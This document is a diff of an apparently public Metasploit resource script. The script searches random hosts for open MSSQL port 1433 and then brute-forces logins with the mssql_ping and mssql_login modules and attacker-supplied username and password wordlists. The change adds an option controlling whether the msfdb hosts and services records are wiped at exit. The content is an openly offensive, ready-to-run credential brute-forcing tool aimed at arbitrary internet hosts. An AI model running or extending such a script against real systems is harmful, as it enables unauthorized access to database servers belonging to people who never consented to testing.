@@ -1,7 +1,8 @@
    <ruby>
       help = %Q|
         Description:
-          setg RANDOM 1000 - Limit number of random rhosts to search
+          setg CLEAN false - Do not clean database at script exit.
+          setg RANDOM 1000 - Limit the number of random rhosts to search
           setg USER_FILE /root/users.txt - To instruct auxiliarys to use our own dicionary file
           setg PASS_FILE /root/passwods.txt - To instruct auxiliarys to use our own dicionary file
           setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 1433 open
@@ -123,19 +124,29 @@
            print_warning("Remote Target port 1433 mssql found")
            Rex::sleep(1.0)
            run_single("use auxiliary/scanner/mssql/mssql_ping")
-           run_single("setg THREADS 16")
+           run_single("set THREADS 16")
            run_single("exploit")
            run_single("use auxiliary/scanner/mssql/mssql_login")
            run_single("exploit")
       end
 
-print_warning("please wait, Cleaning msfdb Database.")
-Rex::sleep(1.5)
-print_line("")
-run_single("unsetg RHOSTS THREADS RANDOM_HOSTS USER_FILE PASS_FILE RANDOM")
-print_line("")
-run_single("services -d")
-run_single("hosts -d")
+
+      print_warning("Please wait, Cleaning global variables.")
+      Rex::sleep(1.5)
+      if (framework.datastore['CLEAN'] == "false")
+           run_single("unsetg CLEAN RHOSTS THREADS RANDOM_HOSTS USER_FILE PASS_FILE RANDOM")
+           run_single("unset THREADS")
+           print_line("")
+      else
+           run_single("unsetg CLEAN RHOSTS THREADS RANDOM_HOSTS USER_FILE PASS_FILE RANDOM")
+           run_single("unset THREADS")
+           print_warning("Please wait, Cleaning database.")
+           Rex::sleep(1.5)
+           run_single("hosts -d")
+           run_single("services -d")
+           print_line("")
+      end
+
 print_warning("Logfile stored under: /root/mssql_brute.log")
 print_status("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
 </ruby>
